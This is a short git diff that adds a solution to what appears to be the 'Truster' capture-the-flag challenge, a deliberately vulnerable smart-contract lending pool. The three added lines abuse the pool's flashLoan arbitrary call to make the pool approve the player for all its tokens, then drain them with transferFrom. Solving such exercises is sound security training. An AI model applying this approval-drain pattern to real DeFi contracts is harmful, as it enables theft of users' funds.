@@ -23,6 +23,9 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const calldata = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])
+        await pool.connect(player).flashLoan(TOKENS_IN_POOL, pool.address, token.address, calldata)
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
     });
 
     after(async function () {
